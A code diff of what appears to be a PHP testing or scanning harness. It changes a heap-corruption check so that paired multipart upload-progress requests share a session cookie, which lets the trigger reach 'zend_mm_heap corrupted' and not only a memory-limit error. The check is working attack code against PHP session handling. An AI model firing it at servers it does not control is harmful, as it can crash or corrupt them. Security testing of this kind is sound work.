@@ -896,7 +896,10 @@ def c_heap_corrupt(url, s, res, args):
         return [line for line in out.splitlines()
                 if line.strip().endswith("zend_mm_heap corrupted") and '"' not in line]
 
-    def req_a():
+    # Same cookie name and shape as c_validate.py. The upload-progress callback
+    # only starts the session during parsing when the request carries a session
+    # id; without one the trigger reaches the memory limit and nothing else.
+    def req_a(sid):
         b = "----a" + _uuid.uuid4().hex
         out = [("--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
                 "\r\n\r\np\r\n" % b).encode()]
@@ -911,19 +914,19 @@ def c_heap_corrupt(url, s, res, args):
             for i in range(0, len(payload), 8192):
                 yield payload[i:i + 8192]
         try:
-            r = s.post(url, data=gen(),
+            r = s.post(url, data=gen(), cookies={"PHPSESSID": sid},
                        headers={"Content-Type": "multipart/form-data; boundary=" + b},
                        timeout=60)
             return "Allowed memory size" in r.text
         except requests.RequestException:
             return False
 
-    def req_b():
+    def req_b(sid):
         b = "----b" + _uuid.uuid4().hex
         payload = ("--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
                    "\r\n\r\np\r\n--%s--\r\n" % (b, b)).encode()
         try:
-            s.post(url, data=payload,
+            s.post(url, data=payload, cookies={"PHPSESSID": sid},
                    headers={"Content-Type": "multipart/form-data; boundary=" + b},
                    timeout=30)
         except requests.RequestException:
@@ -936,9 +939,10 @@ def c_heap_corrupt(url, s, res, args):
     seen_before = corruption_lines()
     ooms = 0
     for _ in range(args.heap_rounds):
-        if req_a():
+        sid = "p2s" + rand(20)  # one session per round, shared by A and B
+        if req_a(sid):
             ooms += 1
-        req_b()
+        req_b(sid)
 
     if ooms:
         res.add("heap_oom_bucket", "info",
